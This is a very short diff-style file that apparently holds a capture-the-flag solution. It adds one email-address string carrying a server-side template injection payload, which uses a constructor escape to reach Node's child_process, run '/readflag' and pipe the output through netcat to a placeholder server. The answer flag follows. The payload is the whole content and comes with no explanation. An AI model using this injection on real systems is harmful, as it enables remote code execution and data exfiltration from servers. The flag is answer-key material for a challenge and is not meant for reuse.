@@ -1,0 +1,3 @@
+email+{{range.constructor("return global.process.mainModule.require('child_process').execSync('/readflag | nc your_server').stdout.toString('hex')")()}}@gmail.com
+
+CHTB{I_can_f1t_my_p4yl04ds_3v3rywh3r3!}
